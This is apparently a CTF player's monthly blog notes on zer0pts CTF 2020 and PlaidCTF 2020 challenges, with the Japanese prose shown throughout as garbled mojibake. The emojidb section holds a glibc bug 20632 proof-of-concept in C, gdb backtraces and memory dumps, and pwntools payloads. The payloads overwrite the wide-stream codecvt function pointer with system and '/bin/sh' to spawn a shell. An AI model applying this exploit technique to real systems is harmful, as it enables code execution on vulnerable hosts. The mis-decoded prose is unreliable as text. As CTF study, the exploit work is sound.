---
layout: page
title: "4æœˆã¾ã¨ã‚"
date: 2020-04-15 00:00:00 -0000
categories: pwn, other 
---

#### ï¼‘ï¼•æ—¥ã¾ã§
å…¨éƒ¨ã‚µãƒœã£ã¦LOLã—ã¦ã¾ã—ãŸã€‚ï¼‘å¹´ç©ºã„ã¦ãŸã®ã§è…•ã¨ãƒ†ã‚£ã‚¢ãŒè½ã¡ã¦ãŸã‘ã©ã€S1ã‹ã‚‰G1ã¾ã§å‹ç‡55%ã§è¡Œã‘ã¾ã—ãŸã€‚æ™‚é–“ç„¡é™ã«ãªããªã‚‹ãªã€‚é¢ç™½ã„ã‚“ã ã‘ã©ã€ä¸Šæ‰‹ãã¯ãªã‚‰ãªã„ã€‚

### zer0ptsctf2020 å¾©ç¿’
- kernelå•ç†è§£ã—ãŸã¤ã‚‚ã‚Šã§è‡ªåˆ†ã§çµ„ã‚“ã ã‚‰å‹•ã‹ãªã„ã€ã„ã¤ã‚‚ã®æ²¼ãŒæ·±ã™ãã¦æŒ«æŠ˜ã—ã¦ãŸã‚“ã ã‘ã©ã€å‹•ã‹ã•ãªã„ã¨å§‹ã¾ã‚‰ã‚“ã®ã§ã€‚
    - å•é¡Œã¯ç°¡å˜ã§ã€æ˜ç¢ºãªã‚µã‚¤ã‚º0x400ã®heap oob R/Wã ã‘ãŒã‚ã‚‹ä¸­ã§rootã‚’å–ã‚‹ã¨ã„ã†ã¨ã“ã‚ã€‚
    - ptmxæ§‹é€ ä½“ãŒåŒã˜ã‚µã‚¤ã‚ºã®kmallocã§ã€ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã—ã‚„ã™ã„ã‚‰ã—ã„ã€‚ã“ã®æ™‚ã€ptmxã®é–¢æ•°ãƒã‚¤ãƒ³ã‚¿ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ãã®å¾Œioctlã‚’æ’ƒã¤ã“ã¨ã§é£›ã³å…ˆã‚’æ“ä½œã—ãŸä¸Šã§é£›ã°ã›ã‚‹ã‚ˆã†ã«ãªã‚‹ã€‚ã‚ã¨ã¯ã„ã¤ã‚‚ã®ropã‚’ã¤ãªãã ã‘ã€‚ä½•ã‚‚è‹¦ã—ã‚€ã‚‚ã®ã¯ãªã„ã¨æ€ã£ã¦ã‚‹ã‚“ã ã‘ã©ã€‚

### pctf 2020
- ãã£ãé›£ã—ã™ãã¦1å•ã‚‚è§£ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚

#### emojidb
- ãƒªãƒ¼ã‚¯ã§ãƒãƒ«ãƒãƒã‚¤ãƒˆã‚’æˆ»ã™é–¢æ•°ã€å¿…ãš?ã«ãªã‚‹ã‹ã‚‰ãƒªãƒ¼ã‚¯ã§ãã¦ãªã„ã§ã™ã­ã£ã¦ãªã£ã¦ã¦ã€å®Ÿã¯çµæ§‹ãªç¢ºç‡ã§è¡¨ç¤ºã¯ã§ãã¦ãŸã‚‰ã—ã„ã€‚ã“ã‚Œã¯ã¡ã‚‡ã£ã¨è¿‚é—Šã ã£ãŸã€‚ã©ã¡ã‚‰ã«ã—ã¦ã‚‚æ›¸ãè¾¼ã¿ã«é–¢ã—ã¦ã¯æ„å‘³ãŒåˆ†ã‹ã£ã¦ãªã‹ã£ãŸã€‚5å€‹ç›®ã®ãƒãƒ£ãƒ³ã‚¯ã‚ã‚‹ãªãƒ¼ãã‚‰ã„ã€‚stderrã«æ›¸ãå¤‰ãªé–¢æ•°ã‚‚ã‚ã‚‹ãªã¨æ€ã£ã¦ã„ãŸãŒã€ã“ã‚ŒãŒé‡è¦ã ã£ãŸã€‚
- writeupã‚’ã‚ã•ã£ã¦ã€ãƒ•ãƒ©ã‚°ã‚’ç¢ºèªã—ãŸã¨ã“ã‚ã€`bug20632`ã¨ã„ã†ç¤ºå”†ãŒã‚ã£ãŸã€‚cveã®ç•ªå·ã‹ã¨æ€ã£ã¦ã„ãŸã‚‰bugzillaã ã£ãŸã€‚https://sourceware.org/bugzilla/show_bug.cgi?id=20632
- å¤§æœ¬å‘½ã®_IO_wfile_overflowãŒãƒã‚°ã‚‹ã¨ã€‚heapã®ãªã‚“ã‹ã‚ˆãã‚ã‹ã‚‰ãªã„ã‚„ã¤ã ã¨æ€ã£ã¦ãŸã ã‘ã«ã€ã ã„ã¶ç†±ã„å±•é–‹ã€‚ã¯ã‚‰ã‚Œã¦ã‚‹POCã¯ä»¥ä¸‹ã®é€šã‚Š

```c
#include <stdio.h>
#include <wchar.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
   /* Close stderr */
   close(2);

   /* Output long string */
   const int sz = 4096;
   wchar_t *buff = calloc(sz+1, sizeof *buff);
   for (int i=0; i < sz; i++) buff[i] = L'x';
   fputws(buff, stderr);

   /* Output shorter string */
   for (int i=0; i < 1024; i++) {
     fputws(L"0123456789ABCDEF", stderr);

     /* Call malloc, which should not crash.
        However it will if malloc's function pointers
        have been stomped. */
     free(malloc(1));
   }
   return 0;
}
```

`gcc`ã—ã¦ãŸã å‹•ä½œã•ã›ã‚‹ã ã‘ã§SEGVã«ãªã‚‹ã€‚malloc_hookãŒæ›¸ãå¤‰ã‚ã£ã¦ã„ã‚‹ã€‚ã‚¢ãƒ‰ãƒ¬ã‚¹å…¥ã‚Œã¦ãªã„ã®ã«æ›¸ãå¤‰ã‚ã£ã¦ã‚“ã®ãšã‚‹ããªã„ã§ã™ã‹ï¼Ÿï¼Ÿï¼Ÿã§ã£ã‹ãæ›¸ã„ã¦ã€ã¡ã£ã•ãæ›¸ãã¨ãƒã‚¤ãƒ³ã‚¿å£Šã‚Œã‚‹ã‚‰ã—ã„ã€‚2.23ã§ç™ºè¦‹ã•ã‚ŒãŸã®ã«ã€2.29ã§ã‚‚åŒã˜ã¨ã“ã‚ã§è½ã¡ã‚‹ã‚“ã ã‘ã©ã‚¬ãƒã‚¬ãƒå¤§ä¸ˆå¤«ã‹ï¼Ÿ

- ã“ã®äººã®èª¬æ˜ã¯ä»¥ä¸‹ã®æ„Ÿã˜ã€‚
    1. `_IO_wfile_overflow`ã«æœ€åˆã®ã§ã‹ã„æ›¸ãè¾¼ã¿ãŒèª­ã¾ã‚Œã¦ã€`_IO_write_ptr`ãŒ`_IO_write_end`ã‚’è¶…ãˆã‚‹ã€‚
    2. ã“ã®ãƒã‚°ã¯é€šå¸¸ã ã¨`_IO_do_flush`ãŒå‘¼ã°ã‚Œã¦ç„¡ã‹ã£ãŸã“ã¨ã«ãªã‚‹ã‚“ã ã‘ã©ã€`stderr`ãŒé–‰ã˜ã‚‰ã‚Œã¦ã„ã‚‹ã¨å¤±æ•—ã™ã‚‹ã®ã§ã€æ®‹ã£ãŸã¾ã¾ã«ãªã‚‹ã€‚
    3. å¾Œã«æ¥ã‚‹å°ã•ã„æ–¹ã®å…¥åŠ›ã¯`_IO_wfile_xsputn`ã«ã‚ˆã°ã‚Œã¦ã€ã“ã“ã§ä½¿ãˆã‚‹ãƒãƒƒãƒ•ã‚¡ã®è¨ˆç®—ãŒå§‹ã¾ã‚‹ã€‚ã“ã®æ™‚ã®å¼ã¯`_IO_write_end - _IO_write_ptr`ã§ã‚ã‚Šã€è² ã«ãªã‚‹ã®ã§ã‚¯ã‚½ã§ã‹ã„å€¤ãŒè¿”ã£ã¦ãã‚‹ã€‚

- çµæœ`_IO_wide_data`ã‹ã‚‰ä¸‹ã‚’ç„¡é™ã«æ›¸ãç¶šã‘ã¦malloc_hookã«åˆ°é”ã™ã‚‹ã€‚ã“ã‚Œã‚’å•é¡Œã«é©ç”¨ã—ãŸã„ã‚“ã ã‘ã©ã€pocã®_IO_write_ptråˆ¥ã«è¶…ãˆã¦ãªã„ã‚“ã ã‘ã©ãªã‚“ã ã“ã‚Œã€‚ã¨ã„ã†ã‹POCæœ€åˆã®`fputws`ã‚’çœç•¥ã—ã¦ã‚‚ä¾ç„¶åˆºã•ã‚‹ã€‚closeã—ã¦ã‚‹ã¨ã“ã‚ã«æ›¸ã„ã¦ã„ãã¨ã‚„ã°ã„ã‚“ã å¤šåˆ†ã€‚ãŸã stderrã®ä»£ã‚ã‚Šã«stdoutã‚„inã§è©¦ã—ã¦ã‚‚ã ã‚ã ã£ãŸã€‚è¬ã€‚
- (4/24) é—‡æ·±ã™ãã‚‹ã€‚writeupæ›¸ã„ã¦ã‚ã‚‹ã“ã¨ã¨ã‚³ãƒ¼ãƒ‰ã§å‹•ã„ã¦ã‚‹å†…å®¹ãŒé•ã„ã™ãã‚‹ã€‚ã‚·ã‚§ãƒ«ãŸã£ãŸå¾Œã®ãƒãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹ãŒä»¥ä¸‹

```
#0  0x00007f7f670a7687 in __GI___waitpid (pid=301, stat_loc=stat_loc@entry=0x7ffd4da93da8, options=options@entry=0) at ../sysdeps/unix/sysv/linux/waitpid.c:30
#1  0x00007f7f67012067 in do_system (line=<optimized out>) at ../sysdeps/posix/system.c:149
#2  0x00007f7f6704931b in __GI__IO_wdo_write (fp=0x7f7f673af760 <_IO_2_1_stdout_>, data=0x7f7f673ae9e8 <_IO_wide_data_1+296> L"\n", to_do=1113) at wfileops.c:75
#3  0x00007f7f67052202 in _IO_flush_all_lockp (do_lock=do_lock@entry=0) at genops.c:769
#4  0x00007f7f67052405 in _IO_cleanup () at genops.c:921
#5  0x00007f7f67006102 in __run_exit_handlers (status=0, listp=<optimized out>, run_list_atexit=run_list_atexit@entry=true, run_dtors=run_dtors@entry=true) at exit.c:130
#6  0x00007f7f6700613a in __GI_exit (status=<optimized out>) at exit.c:139
#7  0x00007f7f66fe4b9e in __libc_start_main (main=0x557721e339d0, argc=1, argv=0x7ffd4da94208, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>,
```
malloc_hookã¨ã‹putwsã¨ã‹å…¨ãé–¢ä¿‚ãªãã¦_IO_flush_lockpãªã‚“ã ã‚ˆãªã€‚ç¶šãã¾ã—ã¦ã€_IO_wdo_writeæ°ãŒä»¥ä¸‹ã€‚

```
_IO_wdo_write (_IO_FILE *fp, const wchar_t *data, _IO_size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

----------(cut)-----------

	  /* Now convert from the internal format into the external buffer.  */
	  result = (*cc->__codecvt_do_out) (cc, &fp->_wide_data->_IO_state,
					    data, data + to_do, &new_data,
					    write_ptr,
					    buf_end,
					    &write_ptr);
```
ãƒ•ãƒ©ãƒƒã‚·ãƒ¥ã™ã‚‹fpã®__codecvt_do_outãŒé–¢æ•°ãƒã‚¤ãƒ³ã‚¿ã§ç¬¬ä¸€å¼•æ•°ãŒãƒã‚¤ãƒ³ã‚¿ã®å…ˆé ­ã€‚å‰è€…ã«systemå¾Œè€…ã«/bin/shã‚’å…¥ã‚Œã‚‹ã¨ç™ºç«ã™ã‚‹ã€‚ã¦ã„ã†ã‹å…¥ã£ã¦ãŸã€‚
```
(gdb) p _IO_wide_data_1  
$1 = {_IO_read_ptr = 0x7f7f673ae9e8 <_IO_wide_data_1+296> L"\n", _IO_read_end = 0x7f7f673ae9e8 <_IO_wide_data_1+296> L"\n", _IO_read_base = 0x7f7f673ae9e8 <_IO_wide_data_1+296> L"\n", 
  _IO_write_base = 0x7f7f673ae9e8 <_IO_wide_data_1+296> L"\n", _IO_write_ptr = 0x7f7f673afb4c <archive_stat+140> L"", 
  _IO_write_end = 0x424242420000000a <error: Cannot access memory at address 0x424242420000000a>, _IO_buf_base = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, 
  _IO_buf_end = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, _IO_save_base = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, 
  _IO_backup_base = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, _IO_save_end = 0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, _IO_state = {
    __count = 1111638594, __value = {__wch = 1111638594, __wchb = "BBBB"}}, _IO_last_state = {__count = 1111638594, __value = {__wch = 1111638594, __wchb = "BBBB"}}, _codecvt = {
    __codecvt_destr = 0x3b68732f6e69622f, __codecvt_do_out = 0x7f7f67012440 <__libc_system>, __codecvt_do_unshift = 0x7f7f67012440 <__libc_system>, __codecvt_do_in = 0x2e726567657400, 
    __codecvt_do_encoding = 0x7f7f0000000a, __codecvt_do_always_noconv = 0x7f7f67049bc0 <do_always_noconv>, __codecvt_do_length = 0x7f7f67049eb0 <do_length>, 
    __codecvt_do_max_length = 0x7f7f67049bd0 <do_max_length>, __cd_in = {__cd = {__nsteps = 1, __steps = 0x5577221dd320, __data = 0x7f7f673ae978 <_IO_wide_data_1+184>}, __combined = {__cd = {__nsteps = 1, 
          __steps = 0x5577221dd320, __data = 0x7f7f673ae978 <_IO_wide_data_1+184>}, __data = {__outbuf = 0x0, __outbufend = 0x0, __flags = 1, __invocation_counter = 0, __internal_use = 1, 
          __statep = 0x7f7f673ae918 <_IO_wide_data_1+88>, __state = {__count = 0, __value = {__wch = 0, __wchb = "\000\000\000"}}}}}, __cd_out = {__cd = {__nsteps = 1, __steps = 0x5577221dd400, 
        __data = 0x7f7f673ae9b8 <_IO_wide_data_1+248>}, __combined = {__cd = {__nsteps = 1, __steps = 0x5577221dd400, __data = 0x7f7f673ae9b8 <_IO_wide_data_1+248>}, __data = {
          __outbuf = 0x7ffd4da8b6f1 "\237\230\261\205\201", __outbufend = 0x7ffd4da8b700 "", __flags = 9, __invocation_counter = 271, __internal_use = 1, __statep = 0x7f7f673ae918 <_IO_wide_data_1+88>, 
          __state = {__count = 0, __value = {__wch = 0, __wchb = "\000\000\000"}}}}}}, _shortbuf = L"\n", _wide_vtable = 0x7f7f673aad60 <_IO_wfile_jumps>}
```


å¾Œã¯ã©ã†å…¥ã‚Œã‚‹ã‹ã€‚ã“ã‚Œã‚‚çµå±€stderrã¸ã®fputwsã§ãƒãƒƒãƒ•ã‚¡ãŒã¯ã¿å‡ºã‚‹ã£ã¦ã„ã†è©±ã ã‹ã‚‰ã€æ›¸ã„ã¦ã‚„ã£ãŸã‚‰ã„ã„ã ã‘ã€‚ãƒªãƒ¼ã‚¯ã—ã¦ã‹ã‚‰5ã¤ç›®ã®ãƒãƒ£ãƒ³ã‚¯ã‚’å…¥ã‚Œã¦æ¡ä»¶ã‚’æº€ãŸã—ã¦ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥ã‚Œã¦ã¿ã‚‹ã€‚

```
payload  = ''
payload += encode("A"*8) 
payload += encode("B"*8)
payload += encode("C"*8)
payload += encode("D"*8)
payload += encode("E"*8)
payload += encode("F"*8)
r.sendafter("ğŸ›‘â“", payload)
```
ã‚»ã‚°ã£ã¦ä»¥ä¸‹ã®æ„Ÿã˜ã€‚

```
Stopped reason: SIGSEGV
internal_utf8_loop (irreversible=0x7ffc101aba40, outend=0x7ffc101abb70 "", outptrp=<synthetic pointer>, 
    inend=0x7f38541549ea <_IO_wide_data_1+298> "\001", inptrp=0x7ffc101abad0, step_data=0x7f38541549b8 <_IO_wide_data_1+248>, 
    step=<optimized out>) at ../iconv/loop.c:325
325	../iconv/loop.c: No such file or directory.
gdb-peda$ bt
#0  internal_utf8_loop (irreversible=0x7ffc101aba40, outend=0x7ffc101abb70 "", outptrp=<synthetic pointer>, 
    inend=0x7f38541549ea <_IO_wide_data_1+298> "\001", inptrp=0x7ffc101abad0, step_data=0x7f38541549b8 <_IO_wide_data_1+248>, 
    step=<optimized out>) at ../iconv/loop.c:325
#1  __gconv_transform_internal_utf8 (step=step@entry=0x55e2c13e6400, data=data@entry=0x7f38541549b8 <_IO_wide_data_1+248>, 
    inptrp=inptrp@entry=0x7ffc101abad0, inend=inend@entry=0x7f38541549ea <_IO_wide_data_1+298> "\001", outbufstart=outbufstart@entry=0x0, 
    irreversible=irreversible@entry=0x7ffc101abac8, do_flush=0x0, consume_incomplete=0x0) at ../iconv/skeleton.c:609
#2  0x00007f3853defe43 in do_out (codecvt=0x7f3854154928 <_IO_wide_data_1+104>, statep=<optimized out>, from_start=<optimized out>, 
    from_end=0x7f38541549ea <_IO_wide_data_1+298> L"\001\xd600000\x7f385415", from_stop=0x7ffc101abb50, to_start=<optimized out>, 
    to_end=0x7ffc101abb70 "", to_stop=0x7ffc101abb58) at iofwide.c:177
#3  0x00007f3853def31b in __GI__IO_wdo_write (fp=fp@entry=0x7f3854155760 <_IO_2_1_stdout_>, 
    data=0x7f3846464646 <error: Cannot access memory at address 0x7f3846464646>, to_do=0x373c0e9) at wfileops.c:75
#4  0x00007f3853def5b5 in __GI__IO_wfile_overflow (f=0x7f3854155760 <_IO_2_1_stdout_>, wch=0x1f195) at wfileops.c:475
#5  0x00007f3853decd52 in __GI___woverflow (wch=0x1f195, f=0x7f3854155760 <_IO_2_1_stdout_>) at wgenops.c:217
#6  __GI__IO_wdefault_xsputn (f=f@entry=0x7f3854155760 <_IO_2_1_stdout_>, data=data@entry=0x7ffc101abed0, n=n@entry=0x5) at wgenops.c:317
#7  0x00007f3853defad1 in __GI__IO_wfile_xsputn (f=0x7f3854155760 <_IO_2_1_stdout_>, data=<optimized out>, n=0x5) at wfileops.c:1012
#8  0x00007f3853dd408a in buffered_vfprintf (s=s@entry=0x7f3854155760 <_IO_2_1_stdout_>, 
    format=format@entry=0x55e2c0c3e020 L"\x1f195\x1f4d6\x1f193\x1f6d1\x2753", args=args@entry=0x7ffc101b4480) at vfprintf.c:2343
#9  0x00007f3853dd10fe in _IO_vfwprintf (s=0x7f3854155760 <_IO_2_1_stdout_>, format=0x55e2c0c3e020 L"\x1f195\x1f4d6\x1f193\x1f6d1\x2753", 
    ap=ap@entry=0x7ffc101b4480) at vfprintf.c:1301
#10 0x00007f3853e9c8dc in __wprintf_chk (flag=0x1, format=<optimized out>) at wprintf_chk.c:36
#11 0x000055e2c0c3da48 in ?? ()
#12 0x00007f3853d8ab97 in __libc_start_main (main=0x55e2c0c3d9d0, argc=0x1, argv=0x7ffc101b4678, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7ffc101b4668) at ../csu/libc-start.c:310
#13 0x000055e2c0c3db6a in ?? ()
gdb-peda$  p _IO_wide_data_1
$1 = {
  _IO_read_ptr = 0x7f38541549e8 <_IO_wide_data_1+296> L"\x1f195", 
  _IO_read_end = 0x7f38541549e8 <_IO_wide_data_1+296> L"\x1f195", 
  _IO_read_base = 0x7f38541549e8 <_IO_wide_data_1+296> L"\x1f195", 
  _IO_write_base = 0x7f3846464646 <error: Cannot access memory at address 0x7f3846464646>, 
  _IO_write_ptr = 0x7f38541549ec <_IO_wide_data_1+300> L"", 
  _IO_write_end = 0x7f38541549e8 <_IO_wide_data_1+296> L"\x1f195", 
  _IO_buf_base = 0x7f38541549e8 <_IO_wide_data_1+296> L"\x1f195", 
  _IO_buf_end = 0x7f38541549ec <_IO_wide_data_1+300> L"", 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _IO_state = {
    __count = 0x0, 
    __value = {
      __wch = 0x0, 
      __wchb = "\000\000\000"
    }
  }, 
  _IO_last_state = {
    __count = 0x0, 
    __value = {
      __wch = 0x0, 
      __wchb = "\000\000\000"
    }
  }, 
  _codecvt = {
    __codecvt_destr = 0x0, 
    __codecvt_do_out = 0x7f3853defdb0 <do_out>, 
    __codecvt_do_unshift = 0x7f3853defcd0 <do_unshift>, 
    __codecvt_do_in = 0x7f3853defbe0 <do_in>, 
    __codecvt_do_encoding = 0x7f3853defba0 <do_encoding>, 
    __codecvt_do_always_noconv = 0x7f3853defbc0 <do_always_noconv>, 
    __codecvt_do_length = 0x7f3853defeb0 <do_length>, 
    __codecvt_do_max_length = 0x7f3853defbd0 <do_max_length>, 
(cut)
```
è¦ã™ã‚‹ã«ï¼¿IO_wide_data_2ã®ä¸‹ã®_IO_wide_data_1ã«ä¼¸ã³ã¡ã‚ƒã£ã¦ã€
1ã®_IO_write_baseãŒã‚¤ã‚«ã‚ŒãŸå€¤ã«ãªã£ã¡ã‚ƒã£ã¦æ¬¡ã®å‘¨ã§è½ã¡ã‚‹ã¨ã„ã†ã“ã¨ã€‚ã“ã‚Œã¯ãƒªãƒ¼ã‚¯ã‚‚ã‚‰ã£ã¦ã‚‹ã‹ã‚‰å…ƒã®å€¤ã§æƒãˆã¦ã‚„ã£ãŸã‚‰ã„ã„ã€‚

```python
payload  = ''
payload += 'A'*4
payload += 'B'*4
payload += 'C'*4
payload += 'D'*4
payload += 'E'*4
payload += p64(IO_wide_data) * 8
payload += 'A'*4
payload += 'B'*4
payload += 'C'*4
payload += 'D'*4
payload += 'A'*4
payload += 'B'*4
payload += 'C'*4
payload += 'D'*4
payload += 'A'*4
payload += 'B'*4
payload += "/bin/sh\x00"
payload += p64(system)
r.sendafter("ğŸ›‘â“", encode(payload))
```
ã“ã‚ŒãŒå…¨éƒ¨è¡Œãã¨ã“ã‚“ãªæ„Ÿã˜

```
0x7f3b61a148a0 <_IO_wide_data_2+288>:	0x0000000000000000	0x414141410000000a
0x7f3b61a148b0 <_IO_wide_data_2+304>:	0x4343434342424242	0x4545454544444444
0x7f3b61a148c0 <_IO_wide_data_1>:	0x00007f3b61a149e8	0x00007f3b61a149e8
0x7f3b61a148d0 <_IO_wide_data_1+16>:	0x00007f3b61a149e8	0x00007f3b61a149e8
0x7f3b61a148e0 <_IO_wide_data_1+32>:	0x00007f3b61a149e8	0x00007f3b61a149e8
0x7f3b61a148f0 <_IO_wide_data_1+48>:	0x00007f3b61a149e8	0x00007f3b61a149e8
0x7f3b61a14900 <_IO_wide_data_1+64>:	0x4242424241414141	0x4444444443434343
0x7f3b61a14910 <_IO_wide_data_1+80>:	0x4242424241414141	0x4444444443434343
0x7f3b61a14920 <_IO_wide_data_1+96>:	0x4242424241414141	0x0068732f6e69622f
0x7f3b61a14930 <_IO_wide_data_1+112>:	0x00007f3b61678440	0x00007f3b616afcd0

```
æ§‹é€ ä½“çš„ã«ã¯ã“ã†ãªã‚‹ã€‚ï¼ˆé•ã†æ—¥ã«ã‚„ã£ãŸã‚‰é€šã‚‰ãªãã¦ã€ã‚ªãƒ•ã‚»ãƒƒãƒˆãŒï¼”ãƒã‚¤ãƒˆãšã‚Œã¦ãŸã€‚è¬ï¼‰
```
$ p _IO_wide_data_1
$1 = {
  _IO_read_ptr = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_read_end = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_read_base = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_write_base = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_write_ptr = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_write_end = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_buf_base = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_buf_end = 0x7f3b61a149e8 <_IO_wide_data_1+296> L"\n", 
  _IO_save_base = 0x4242424241414141 <error: Cannot access memory at address 0x4242424241414141>, 
  _IO_backup_base = 0x4444444443434343 <error: Cannot access memory at address 0x4444444443434343>, 
  _IO_save_end = 0x4242424241414141 <error: Cannot access memory at address 0x4242424241414141>, 
  _IO_state = {
    __count = 0x43434343, 
    __value = {
      __wch = 0x44444444, 
      __wchb = "DDDD"
    }
  }, 
  _IO_last_state = {
    __count = 0x41414141, 
    __value = {
      __wch = 0x42424242, 
      __wchb = "BBBB"
    }
  }, 
  _codecvt = {
    __codecvt_destr = 0x68732f6e69622f, 
    __codecvt_do_out = 0x7f3b61678440 <__libc_system>,
```
_IO_write_baseã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å®ˆã‚Šã¤ã¤ãã®ä¸‹ã®__codecvtã®é ­ã¨_do_outã‚’æ›¸ãæ›ãˆã‚‰ã‚Œã‚‹ã€‚ã‚·ã‚§ãƒ«ã¯ç«‹ã¡ä¸ŠãŒã£ãŸãŒã¾ã ã‚ªãƒãŒã‚ã‚‹ã€‚  
btãŒã“ã‚Œ

```
#0  0x00007f3b6170d687 in __GI___waitpid (pid=0x1c9, stat_loc=stat_loc@entry=0x7fff13dc70d8, options=options@entry=0x0)
    at ../sysdeps/unix/sysv/linux/waitpid.c:30
#1  0x00007f3b61678067 in do_system (line=<optimized out>) at ../sysdeps/posix/system.c:149
#2  0x00007f3b616af31b in __GI__IO_wdo_write (fp=fp@entry=0x7f3b61a15760 <_IO_2_1_stdout_>, 
    data=0x7f3b61a149e8 <_IO_wide_data_1+296> L"\x1f195", to_do=0x1) at wfileops.c:75
#3  0x00007f3b616af5b5 in __GI__IO_wfile_overflow (f=0x7f3b61a15760 <_IO_2_1_stdout_>, wch=0x1f195) at wfileops.c:475
#4  0x00007f3b616acd52 in __GI___woverflow (wch=0x1f195, f=0x7f3b61a15760 <_IO_2_1_stdout_>) at wgenops.c:217
#5  __GI__IO_wdefault_xsputn (f=f@entry=0x7f3b61a15760 <_IO_2_1_stdout_>, data=data@entry=0x7fff13dc7610, n=n@entry=0x5) at wgenops.c:317
#6  0x00007f3b616afad1 in __GI__IO_wfile_xsputn (f=0x7f3b61a15760 <_IO_2_1_stdout_>, data=<optimized out>, n=0x5) at wfileops.c:1012
#7  0x00007f3b6169408a in buffered_vfprintf (s=s@entry=0x7f3b61a15760 <_IO_2_1_stdout_>, 
    format=format@entry=0x55e40f841020 L"\x1f195\x1f4d6\x1f193\x1f6d1\x2753", args=args@entry=0x7fff13dcfbc0) at vfprintf.c:2343
#8  0x00007f3b616910fe in _IO_vfwprintf (s=0x7f3b61a15760 <_IO_2_1_stdout_>, format=0x55e40f841020 L"\x1f195\x1f4d6\x1f193\x1f6d1\x2753", 
    ap=ap@entry=0x7fff13dcfbc0) at vfprintf.c:1301
#9  0x00007f3b6175c8dc in __wprintf_chk (flag=0x1, format=<optimized out>) at wprintf_chk.c:36
#10 0x000055e40f840a48 in ?? ()
#11 0x00007f3b6164ab97 in __libc_start_main (main=0x55e40f8409d0, argc=0x1, argv=0x7fff13dcfdb8, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fff13dcfda8) at ../csu/libc-start.c:310
```
å¤šåˆ†æ›¸ãæ›ãˆãŸæ¬¡ã®å‘¨ã®wprintfã‹ã‚‰woverflowãŒå‹•ã„ã¦ã¦ãã“ã‹ã‚‰è¡Œã£ã¦ã‚‹ã€‚flush_lockpä½¿ã‚ã‚“ã§ã„ã„ã®ã‹ã€‚ã•ã£ãã®ä½•ã ã£ãŸã‚“ã ã€‚ã¾ã‚ã„ãšã‚Œã«ã—ã¦ã‚‚close()ã—ã¦ã„ã‚‹ã¨ã“ã‚ã«æ›¸ãè¾¼ã‚€ã ã‘ã§ã©ãˆã‚‰ã„ã“ã¨ã«ãªã‚‹ã®ã¯ç†è§£ã—ãŸã€‚

#### golf.so
- __libc_start_mainã‚’execveæ›¸ã„ã¦çµ‚ã‚ã‚Šã˜ã‚ƒã€œâ†’ãƒ•ã‚¡ã‚¤ãƒ«ã‚µã‚¤ã‚ºã§ã‹ã™ãã¦çµ‚ã‚ã‚Šã˜ã‚ƒã€œã£ã¦ãªã£ã¦è©°ã‚“ã ã€‚ãªã‚“ã§ã‚¢ã‚»ãƒ³ãƒ–ãƒ©ã§å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãµã‚Šã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ›¸ã‘ã‚‹ã®ã‹åˆ†ã‹ã‚‰ã‚“ã€‚ã“ã‚Œã¯ãã‚Œã„ãªçŸ¥è­˜ä¸è¶³ã€‚  
https://teamrocketist.github.io/2020/04/20/Misc-PCTF2020-golf-so/  
ã¨ã‚Šã‚ãˆãšã“ã‚Œã‚’è¦‹ã¦ã€  
https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html  
ã“ã‚Œã‚’èª­ã‚“ã ã€‚ãŠã‚‚ã—ã‚ã„ã€‚å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã©ã‚Œã ã‘å°ã•ãã§ãã‚‹ã‹ã¨ã„ã†è¨˜äº‹ã€‚ãƒã‚¤ãƒ³ãƒˆã¯ä»¥ä¸‹ã€‚
- ã¾ã£ã¨ã†ã«gccã™ã‚‹ã¨mainã‚’å‘¼ã¶ãŸã‚ã«å¤šå¤§ãªåŠ´åŠ›ã‚’å‰²ããŸã‚ã‚µã‚¤ã‚ºãŒå¤§ãããªã‚‹ã€‚_startã«ã‚¢ã‚»ãƒ³ãƒ–ãƒ©ã‚’ã‹ã‘ã°å°ã•ããªã‚‹ã€‚
- ãƒ˜ãƒƒãƒ€ã®ä¸­ã«ã¯å°†æ¥çš„ã«ä½¿ã†ãŸã‚ã«ã¨ã‚Šã‚ãˆãš0ã§åŸ‹ã‚ã¦ã„ã‚‹éƒ¨åˆ†(16byte)ãŒã‚ã£ã¦ã€ãã“ã«_startã‚’ç½®ã„ã¦ã‚‚ã„ã„ã€‚
- elfã«ã¯elfãƒ˜ãƒƒãƒ€ã¨ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãƒ˜ãƒƒãƒ€ãŒå¿…è¦ãªã‚“ã ã‘ã©ã“ã‚Œã‚‚é‡è¤‡ã—ã¦è‰¯ã„ã€‚
